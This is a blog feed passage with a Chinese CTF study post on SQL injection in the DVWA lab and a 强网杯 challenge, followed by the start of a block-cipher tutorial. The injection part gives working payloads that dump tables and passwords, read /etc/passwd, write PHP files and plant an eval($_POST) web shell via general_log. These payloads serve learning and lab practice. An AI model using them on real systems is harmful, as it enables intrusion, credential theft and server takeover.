    <content type="html"><![CDATA[<p>[TOC]</p><blockquote><p>不完全的知识点，学到后面感觉边听课边记录效率太低，故舍弃记录（</p></blockquote><p>ASCII 编码部分</p><p><ahref="https://c.biancheng.net/c/ascii/">ASCII码一览表，ASCII码对照表(biancheng.net)</a></p><table><thead><tr class="header"><th style="text-align: left;"><strong>十六进制</strong></th><th><strong>字符</strong></th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">23</td><td>#</td></tr><tr class="even"><td style="text-align: left;">30</td><td>0</td></tr><tr class="odd"><td style="text-align: left;">31</td><td>1</td></tr><tr class="even"><td style="text-align: left;">41</td><td>A</td></tr><tr class="odd"><td style="text-align: left;">42</td><td>B</td></tr><tr class="even"><td style="text-align: left;">61</td><td>a</td></tr><tr class="odd"><td style="text-align: left;">62</td><td>b</td></tr><tr class="even"><td style="text-align: left;">126</td><td>~</td></tr></tbody></table><h2 id="一sql注入简述">一、SQL注入简述</h2><p><ahref="https://zhuanlan.zhihu.com/p/681819441">【万字解析】SQL注入精粹：从0到1的注入之路- 知乎 (zhihu.com)</a></p><h3 id="什么是-sql-注入">什么是 SQL 注入</h3><p>从客观角度来看，SQL注入是因为前端输入控制不严格造成的漏洞，使得攻击者可以输入对后端数据库有危害的字符串或符号，使得后端数据库产生回显或执行命令，从而实现对于数据库或系统的入侵；</p><p>从攻击者角度来看，需要拼接出可以使后端识别并响应的 SQL命令，从而实现攻击</p><h2 id="二联合查询注入">二、联合查询注入</h2><h3 id="dvwa-sql-injection">DVWA-SQL Injection</h3><p>这里用DVWA靶机环境的SQL Injection部分做演示。</p><p>① 判断是否存在注入，注入是字符型还是数字型</p><p>SQL注入测试，输入<code>1' or '1234' = '1234</code> ，</p><p>此时最终查询的SQL语句为：</p><p><code>SELECT first_name,last_name FROM users WHERE user_id='1'or'1234'=1234'</code></p><p>查询条件判断恒为真，返回users表中所有的用户数据</p><p>如果不存在SQL注入，应该什么都不返回；如果返回了，说明or生效了，用户的输入了变成了满足SQL语法的语句，SQL注入发生了</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404211943067.png"alt="判断是否存在注入" /><figcaption aria-hidden="true">判断是否存在注入</figcaption></figure><p>② 猜解SOL查询语句中的字段数</p><p>字段数就是列数</p><p>输入<code>1' or 1 = 1 order by 1 #</code>，查询成功</p><p>order by 几就是以第几列为基准来排序，</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404211947675.png"alt="查询1" /><figcaption aria-hidden="true">查询1</figcaption></figure><p>输入<code>1' or 1 = 1 order by 2 #</code>，查询成功</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404211948490.png"alt="查询2" /><figcaption aria-hidden="true">查询2</figcaption></figure><p>输入<code>1' or 1 = 1 order by 3 #</code>，查询失败</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404211949621.png"alt="查询3" /><figcaption aria-hidden="true">查询3</figcaption></figure><p>③ 确定显示的字段顺序</p><p>输入<code>1' union select 1,2 #</code>，查询成功</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404211951840.png"alt="确定显示的字段顺序" /><figcaption aria-hidden="true">确定显示的字段顺序</figcaption></figure><p>因此字段显示的顺序和输出也得到了确认。接下来就可以进一步利用union联合查询更快速地获取更多的数据。</p><p>④ 获取当前数据库名</p><p>输入<code>1' union select 1,database() #</code>，查询成功</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404211952687.png"alt="获取当前数据库名" /><figcaption aria-hidden="true">获取当前数据库名</figcaption></figure><p>说明当前的数据库为dvwa。</p><p>⑤ 获取当前数据库的表名</p><p>输入</p><p><code>1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code>，</p><p>本来是应该查询成功的，但是我这里查询失败了，报错：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404212119586.png"alt="报错" /><figcaption aria-hidden="true">报错</figcaption></figure><p>查询发现出现这个问题是因为：</p><p>information_schema数据库里面都是utf8_general_ci，而靶场网站user表中的数据都是utf8_unicode_ci</p><p>然后就搜到了一篇文章是这样查询的：</p><p><ahref="https://blog.csdn.net/weixin_45868644/article/details/119814857">DVWA笔记（一）SQLInjection（SQL注入）_数据库dvwa各个表名称以及表中列名名称-CSDN博客</a></p><p><code>1' union select 1,group_concat(table_name)collate utf8_general_ci from information_schema.tables where table_schema=database() #</code></p><p>这次可以查询成功：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404212123110.png"alt="获取当前数据库的表名" /><figcaption aria-hidden="true">获取当前数据库的表名</figcaption></figure><p>说明数据库dvwa中一共有两个表，guestbook与users。</p><p>⑥ 获取表中的字段名</p><p>输入</p><p><code>1' union select 1,group_concat(column_name) from information_schema.columns where table_name = 'users' #</code></p><p>还是跟上面一样，用这个语句查询失败</p><p>我们还是继续用下面的这个：</p><p><code>1' union select 1,group_concat(column_name)collate utf8_general_ci from information_schema.columns where table_name ='users' #</code></p><p>查询成功：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404212128664.png"alt="获取表中的字段名" /><figcaption aria-hidden="true">获取表中的字段名</figcaption></figure><p>说明users表中有11个字段</p><p>⑦ 查询数据</p><p>输入</p><p><code>1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</code>，</p><p>查询成功:</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404212131202.png"alt="查询数据" /><figcaption aria-hidden="true">查询数据</figcaption></figure><p>如果group_contact被过滤了，而又只能返回一条数据，怎么办？用limit</p><h3 id="ctf中联合查询常用套路">CTF中联合查询常用套路</h3><p>order by 猜列数</p><p>union select 跟列数找到回显点，对应的地方放查询语句</p><p>例如：得知有3列可以union select233,666,777找到页面中回显的地方，比如233回显在了页面中，则可以unionselect database(),666,777即可得到数据库名</p><h2 id="三mysql文件操作">三、MySQL文件操作</h2><p>可以通过SHOW VARIABLES语句查看采统变量及其值。</p><p>mysql&gt; show variables;</p><p>可以使用like语句来匹配和筛选。</p><p>mysql&gt; show variables like “a%”; 回显一个以a开头的变量</p><p><strong>secure_file_priv</strong></p><p>secure_file_priv对读写文件有影响。</p><p>secure-file-priv参数是用来限制LOAD DATA，SELECT...OUTFILE，andLOAD_FILE()传到哪个指定目录的。</p><p>当secure_file_priv的值为null，表示限制mysqld不允许导入|导出。默认是null</p><p>当secure_file_priv的值为/tmp/，表示限制mysqld的导入|导出只能发生在/tmp/目录</p><p>当secure_file_priv的值没有具体值时，表示不对mysqld的导入|导出做限制</p><p>MysqL读文件</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">Select load_file(&#x27;/flag’)<span class="hljs-comment">;</span><br>SELECT CONVERT(<span class="hljs-name">LOAD_FILE</span>(<span class="hljs-string">&quot;/etc/passwd&quot;</span>) USING utf8)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>MysqI写文件</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; into outfile &quot;/tmp/l.php&quot;;</span><br><span class="language-xml">select &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; into dumpfile &quot;/tmp/1.php&quot;;</span><br></code></pre></td></tr></table></figure><p>outfile函数可以导出多行，而dumpfile只能导出一行数据</p><p>outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式</p><blockquote><p>其实区别不大</p></blockquote><h2 id="四堆叠注入">四、堆叠注入</h2><p>当secure_file_priv为NULL</p><p>堆叠注入</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">set global general_log=on;</span><br><span class="language-xml">set global general_log_file=&#x27;c:/phpstudy/Www/789.php&#x27;;</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_PoST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;;</span><br></code></pre></td></tr></table></figure><p>堆叠注入 MySQL可以执行多条语句，多条语之前用;做分隔。</p><p>简单的说，由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如RENAME、DROP等，堆叠注入可以用于执行任何SOL语句。</p><p>如下执行查询时，第一个语句执行信息查询，第二个语句则将表user的所有内容给删除了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = 1;delete from <span class="hljs-built_in">users</span>;</span><br></code></pre></td></tr></table></figure><p>堆叠注入并不是在每种情况下都能使用的。大多数时候，因为API或数据库引擎的不支持，堆叠注入都无法实现。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">条件 <span class="hljs-symbol">$mys</span>qli-&gt;multi_query(<span class="hljs-symbol">$s</span>ql);<br></code></pre></td></tr></table></figure><p>注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。建议使用union联合注入，若无法使用联合注入，可考虑使用RENAME关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名。</p><h3 id="强网杯-2019随便注">[强网杯 2019]随便注</h3><p>随意加上<strong>英文输入法下的</strong>单引号，报错，说明存在SQL注入</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404222040960.png"alt="1" /><figcaption aria-hidden="true">1</figcaption></figure><p>单引号闭合，尝试<code>1' and 1 =2 #</code></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404222042148.png"alt="2" /><figcaption aria-hidden="true">2</figcaption></figure><p>什么都没返回，说明SQL注入发生了</p><p>紧接着我们可以使用一些关键字，比如<code>1' union select</code></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404222043807.png"alt="3" /><figcaption aria-hidden="true">3</figcaption></figure><p>发现报错，返回了一个正则表达式，这里有一个很关键的地方——不让用select，致命打🥚</p><blockquote><p>SQL8.0有新的语法，但这里是老版本</p></blockquote><p>过滤select</p><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">handler users <span class="hljs-built_in">open</span> <span class="hljs-keyword">as</span> hd; <span class="hljs-comment">#指定数据表进行载入并将返回句柄</span><br>handler hd <span class="hljs-built_in">read</span> <span class="hljs-keyword">first</span>; <span class="hljs-comment">#读取指定表/句柄的首行数据</span><br>handler hd <span class="hljs-built_in">read</span> next; <span class="hljs-comment">#读取指定表/句柄的下一行数据</span><br>handler hd <span class="hljs-built_in">close</span>; <span class="hljs-comment">#关闭句柄</span><br></code></pre></td></tr></table></figure><p><code>1'; show tables; #</code></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404222051441.png"alt="4" /><figcaption aria-hidden="true">4</figcaption></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27;; show columns <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>`; <span class="hljs-comment">#</span><br><span class="hljs-comment">#注意这里用两个点来包裹1919810931114514</span><br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404222144960.png"alt="5" /><figcaption aria-hidden="true">5</figcaption></figure><p>1919里面有一个叫flag的列，这个列的类型是varchar(100)</p><p>库知道，表知道，列知道，下面就是查数据</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">目标:<span class="hljs-keyword">select</span> flag from <span class="hljs-string">&#x27;1919810931114514`;#</span><br><span class="hljs-string">利用handler绕过：</span><br><span class="hljs-string">&#x27;</span>;handler <span class="hljs-string">`1919810931114514`</span> <span class="hljs-keyword">open</span>;handler <span class="hljs-string">`1919810931114514`</span> <span class="hljs-keyword">read</span> first<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404222202902.png"alt="6" /><figcaption aria-hidden="true">6</figcaption></figure><h2 id="五宽字节注入">五、宽字节注入</h2><blockquote><p>慢慢淡出舞台了已经，了解即可</p></blockquote><p>宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。</p><p>通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。在php中，我们可以通过输出echostrlen("和");来测试</p><p>echo strlen("和”);</p><p>当将页面编码保存为gbk时输出2，utf-8时输出3</p><p>除了gbk以外，所有ANSI编码都是2个字节。ANSI只是一个标准，在不同的电脑上它代表的编码可能不相同，比如简体中文系统中ANSI就代表是GBK。</p><p>宽字节注入主要是源于程序员设置<strong>数据库编码</strong>与<strong>PHP编码</strong>设置为不同的两个编码那么就有可能产生宽字节注入。</p><p>PHP的编码为 UTF-8而 MySql的编码设置为了SET NAMES 'gbk' 或是SETcharacter_set_client=gbk，这样配置会引发编码转换从而导致的注入漏洞。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-string">&quot;set names &#x27;gbk&#x27;;&quot;</span>); <span class="hljs-comment">#一般有这行语句的时候考虑一下</span><br></code></pre></td></tr></table></figure><h2 id="六mysql布尔盲注">六、⭐MySQL布尔盲注</h2><h3 id="初识盲注">初识盲注</h3><p>布尔盲注-回显不同</p><p>时间盲注-响应时间不同</p><p>布尔状态例如</p><ol type="1"><li>回显不同 (内容、长度)</li><li>HTTP响应状态码不同(200、500)</li><li>HTTP响应头变化(无条件重定向、设置cookie)</li><li>基于错误的布尔注入(MySQL是否报错)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs mysql">初识盲注<br>select * from users where id =&#x27;1&#x27; and 1=1 #&#x27;<br>select * from users where id =&#x27;1&#x27; and 1=2 #&#x27;<br>select * from users where id =&#x27;1&#x27; and substr((select database()),1,1)= &#x27;a&#x27; #&#x27;<br>select * from users where id =&#x27;1&#x27; and substr((select database()),1,1)= &#x27;c&#x27; #&#x27;<br><br># 一个一个试，试第一位是啥<br>select * from users where id =&#x27;1&#x27; and substr((select database()),1,1)= &#x27;a&#x27; #&#x27;<br>select * from users where id =&#x27;1&#x27; and substr((select database()),1,1)= &#x27;b&#x27; #&#x27;<br>select * from users where id =&#x27;1&#x27; and substr((select database()),1,1)= &#x27;c&#x27; #&#x27;<br>select * from users where id =&#x27;1&#x27; and substr((select database()),1,1)= &#x27;d&#x27; #&#x27;<br>select * from users where id =&#x27;1&#x27; and substr((select database()),1,1)= &#x27;e&#x27; #&#x27;<br>select * from users where id =&#x27;1&#x27; and substr((select database()),1,1)= &#x27;f&#x27; #&#x27;<br><br># 一个一个试，试第二位是啥<br>select * from users where id =&#x27;1&#x27; and substr((select database()),2,1)= &#x27;a&#x27; #&#x27;<br>select * from users where id =&#x27;1&#x27; and substr((select database()),2,1)= &#x27;b&#x27; #&#x27;<br>select * from users where id =&#x27;1&#x27; and substr((select database()),2,1)= &#x27;c&#x27; #&#x27;<br>select * from users where id =&#x27;1&#x27; and substr((select database()),2,1)= &#x27;d&#x27; #&#x27;<br>select * from users where id =&#x27;1&#x27; and substr((select database()),2,1)= &#x27;e&#x27; #&#x27;<br>select * from users where id =&#x27;1&#x27; and substr((select database()),2,1)= &#x27;f&#x27; #&#x27;<br><br></code></pre></td></tr></table></figure><h3 id="盲注的两大基本问题">盲注的两大基本问题</h3><p>1.字符串的截取</p><p>2.比较</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span>substr() substring()<br><br>SUBSTR (str, pos)<br>截取从pos位置开始到最后的所有str字符串<br><br>SUBSTR (str, pos, len)<br>如：<span class="hljs-keyword">select</span> substr(<span class="hljs-string">&#x27;abcdefg&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)，一般是用这个<br><br>注意pos是从<span class="hljs-number">1</span>开始数的<br><br>过滤了逗号怎么办?<br><span class="hljs-keyword">SELECT</span> SUBSTR(<span class="hljs-string">&#x27;2018-08-17&#x27;</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>);与<span class="hljs-keyword">SELECT</span> SUBSTR(<span class="hljs-string">&#x27;2018-08-17&#x27;</span> <span class="hljs-keyword">FROM</span> <span class="hljs-number">6</span> <span class="hljs-keyword">FOR</span> <span class="hljs-number">5</span>); 意思一样<br><br><br><br><span class="hljs-number">2.</span>mid()<br>SQLMID()函数用于得到一个字符串的一部分。这个函数被MySQL支持，但不被MS SQLServer和Oracle支持。<br>在SQLServer,Oracle 数据库中，我们可以使用 <span class="hljs-keyword">SQL</span> SUBSTRING函数或者 <span class="hljs-keyword">SQL</span> SUBSTR函数作为替代。<br>在mysql里和substr()基本一样~~<br></code></pre></td></tr></table></figure><blockquote><p>substr((select database()),1,1) = ‘d’</p></blockquote><blockquote><p>先不记录了，我就学吧我先</p><p>k</p><p>k</p><p>k</p></blockquote><h2 id="七延时盲注">七、延时盲注</h2><h2 id="八报错注入">八、报错注入</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">updatexml</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">extractvalue</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><h2 id="九无列名盲注">九、无列名盲注</h2><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users<br><br><span class="hljs-keyword">select</span> a<span class="hljs-number">.2</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users)a <br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF-Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学-3-分组密码</title>
    <link href="/2024/04/21/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AF%BC%E8%AE%BA-3-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/"/>
    <url>/2024/04/21/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AF%BC%E8%AE%BA-3-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="分组密码">分组密码</h1><h2 id="概念">概念</h2><p>若明文流被分割成等长串，各串用相同的加密算法和相同的密钥进行加密，就是分组密码。即当：</p><ol type="1"><li><p>明文和密文是固定长度为 <spanclass="math inline">\(\mathrm{n}\)</span> 的比特串 <spanclass="math inline">\(m=m_1 m_2 m_3 \cdots m_n\)</span>, <spanclass="math inline">\(c=c_1 c_2 c_3 \cdots c_n\)</span></p></li><li><p>加密密钥和解密密钥相等，是固定长度为 <spanclass="math inline">\(r\)</span> 的比特串 <spanclass="math inline">\(k=k_1 k_2 k_3 \cdots k_r\)</span></p></li><li><p>加密算法为 <spanclass="math inline">\(c=\operatorname{Enc}_K(m)\)</span></p></li><li><p>解密算法为 <spanclass="math inline">\(m=\operatorname{Dec}_k(c)=\operatorname{Dec}_K\left(\operatorname{Enc}_k(m)\right)\)</span>.</p></li></ol><p>则称这样的加解密算法为分组密码</p><h2 id="构造原则">构造原则</h2><p>分组密码的构造都应遵循下列几个原则：</p><ul><li><p>要有足够大分组长度（保证足够大的明文空间，避免给攻击者提供太多的明文统计特征信息）</p></li><li><p>密钥空间要尽可能大（防止穷举密钥）</p></li><li><p>保证足够强的密码算法复杂度以加强分组密码算法自身的安全性，</p><p>方法如下：</p><ul><li><p>先将一个明文分组划分为若干子组分别进行处理，然后合并起来再做一些适当的变换，以增大密码算法强度。采取这样的措施也便于密码算法的实际分析和评测</p></li><li><p>采用乘积密码的思想。通过两种或两种以上简单密码的逐次应用，构成强度比其中任何一个更强的加密结果。有效克服单一密码变换的弱点</p></li></ul></li><li><p>软件实现尽量采用子块和简单运算，采用加法、乘法、异或和移位等指令，易于标准处理器完成运算</p></li><li><p>加解密硬件结构最好一致，这样便于应用超大规模集成芯片实现。以简化系统整体结构的复杂性。</p></li></ul><h2 id="增强密码算法复杂度的方法">增强密码算法复杂度的方法</h2><p>在分组密码算法的安全策略中，用的最多的就是采用代换一置换网络(Substitution-PermutationNetwork)，简称SP网络</p><blockquote><p>由多重<em>S</em> (substitution)变换和<em>P</em>(permutation)变换组合成的变换网络，即迭代密码，它是乘积密码的一种，由Shannon提出</p><p><em>S</em>变换称为<em>S</em>盒，<em>P</em>变换称为<em>P</em>盒。<em>S</em>盒起到混乱作用，<em>P</em>盒起到扩散作用</p><p>substitution：代替，</p><p>permutation：[数] 排列；[数] 置换</p></blockquote><ul><li><strong>S变换</strong>：把输入的一个n长的比特串转化为另一个m长的比特串输出（起到<strong>混乱</strong>的效果）</li><li><strong>P盒变换</strong>:通过把一个比特串中各比特的位置次序重新排列而得到新的比特串的变换（起到<strong>扩散</strong>的效果）</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202403210838992.png"alt="SP网络" /><figcaption aria-hidden="true">SP网络</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404280914789.png"alt="SP" /><figcaption aria-hidden="true">SP</figcaption></figure><p>✓ <em>S</em>盒的输入和输出位数不一定相同，有可逆和不可逆之分。可逆的S盒的输入位数和输出位数相同</p><p>✓<em>P</em>盒有三种类型：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404280917141.png"alt="P盒" /><figcaption aria-hidden="true">P盒</figcaption></figure><h2 id="分组密码加密原理">分组密码加密原理</h2><p>分组密码一般都采用代换置换网络的结构，这种结构的一个典型代表是Feistel密码结构</p><p>基本思路是采用<strong>扩散与混乱</strong>两个主要思想：</p><ul><li>混乱：是指明文与密钥、以及密文之间的统计关系尽可能复杂化，使破译者无法理出相互间的依赖关系，从而加强隐蔽性。采用复杂的非线性代替变化（比如S盒单元）就可达到比较好的混乱效果。<strong>基于代替操作实现</strong></li><li>扩散：是指让明文中的每一位（包括密钥的每一位）直接或间接影响输出密文中的许多位，或者让密文中的每一位受制于输入明文以及密钥中的若干位，以便达到隐蔽明文的统计特性。它强调输入位只要很小变化，经过多轮变换后将导致输出发生多位变化，即明文的每位比特变化将引起密文许多比特位迅速发生改变。<strong>基于换位操作实现</strong></li></ul><p>乘积密码有助于实现扩散和混乱</p><p>✓顺序地执行两个或多个基本密码系统，使得最后结果的密码强度高于每个基本密码系统产生的结果（Feistel分组密码结构）</p><h2 id="lucifer算法">Lucifer算法</h2><blockquote><p>Lucifer算法是由IBM的德裔物理学家和密码学家霍斯特·费斯妥（HorstFeistel）在70年代中期设计的一种分组算法，它具有可变的轮数及可变的分组长度的特点，加密和解密过程互为逆运算。这个算法也被认为是DES的基础。</p></blockquote><p>✓是用<em>S</em>盒和<em>P</em>盒交替在密钥控制下组成复杂的、分组长度足够大的密码设计方法</p><p>✓ 输入：128位明文和512位密钥</p><p>✓ 每个<em>S</em>盒的输入、输出均为4位，每轮32个<em>S</em>盒</p><p>✓<em>S</em>盒的第一轮输入为明文，输出作为<em>P</em>盒的输入，经<em>P</em>盒换位后，再作为下一轮<em>S</em>盒的输入</p><p>✓<em>P</em>盒是线性的，其作用是打乱各<em>S</em>盒输出数字的次序，将各<em>S</em>盒的输出分到下一级不同的各<em>S</em>盒的输入端，起到扩散作用</p><p>✓<em>S</em>盒提供非线性变换，将来自上一级不同的<em>S</em>盒的输出进行”混淆“</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404280928137.png"alt="Lucifer算法" /><figcaption aria-hidden="true">Lucifer算法</figcaption></figure><blockquote><p>现代分组密码都属于乘积密码，可分为两种类型：</p><p>✓同时使用了可逆和不可逆的基本变换部件，这一类被称为<strong>Feistel密码</strong>，DES是这一类的典型密码算法</p><p>✓只使用了可逆的基本变换部件，这一类被称为<strong>非Feistel密码</strong>，AES是这一类的典型密码算法</p></blockquote><h2 id="feistel密码结构">Feistel密码结构</h2><ul><li>20世纪60年代未由IBM公司的Horst Feistel和WalterTuchman在设计LUCIFFER分组密码算法（即DES前期模型）时提出</li><li>特点：通过代替和置换（S-P网络）交替的方式来构造分组密码，其实就是基于混乱和扩散原理实现加解密运算</li></ul><p>✓ 输入为2<em>w</em>比特的分组（称为左半分组<spanclass="math inline">\(L_0\)</span>和右半分组<spanclass="math inline">\(R_0\)</span>）</p><p>✓ Feistel网络由<em>n</em>个基本结构单元构成（但子密钥<spanclass="math inline">\(K_i\)</span>互不相同），左右分组经过<em>n</em>轮迭代后交换位置组合在一起成为密文</p><p>✓ 运算逻辑关系 <span class="math display">\[\begin{aligned}&amp;L_i=R_{i-1}(i=1,2,...,n)\\&amp;R_i=L_{i-1}\oplusF(R_{i-1},K_i)(i=1,2,...,n)\end{aligned}\]</span> ✓ 函数<span class="math inline">\(F\)</span>称为轮函数</p><p>✓ <span class="math inline">\(K_i\)</span>是第<spanclass="math inline">\(i\)</span>轮用的子密钥，由加密密钥<spanclass="math inline">\(K\)</span>生成</p><p><span class="math inline">\(\checkmark\)</span>每轮迭代结构相同</p><p><spanclass="math inline">\(\checkmark\)</span>每轮中右半数据被作用于轮函数F后，再与左半数据进行异或运算，即代替过程</p><p><spanclass="math inline">\(\checkmark\)</span>每轮迭代的轮函数相同，但每轮的子密钥<spanclass="math inline">\(K_i\)</span>不同</p><p><spanclass="math inline">\(\checkmark\)</span>代替过程完成后，再交换左右两半数据实现置换</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160847012.png"alt="Feistel密码结构" /><figcaption aria-hidden="true">Feistel密码结构</figcaption></figure><h3id="feistel结构实现依赖的主要参数与特征">Feistel结构实现依赖的主要参数与特征</h3><p>分组长度：越长安全性越高，但运算速度越慢，一般选用64、128、256或512位的分组长度</p><p>密钥长度：越长安全性越高，但运算速度越慢，通常使用的密钥长度为128、256、512位等</p><p>迭代轮数：越多安全性越高，但运算开销越大，通常采用16次</p><p>子密钥生成算法：算法越复杂，密码分析越困难</p><p>轮函数<em>F</em>：复杂性越高，密码分析越困难</p><p>Feistel结构的解密过程本质上与加密过程一致，基本处理方法是：以密文作为算法的输入，并按加密的逆序使用子密钥<spanclass="math inline">\(K_i\)</span></p><h3 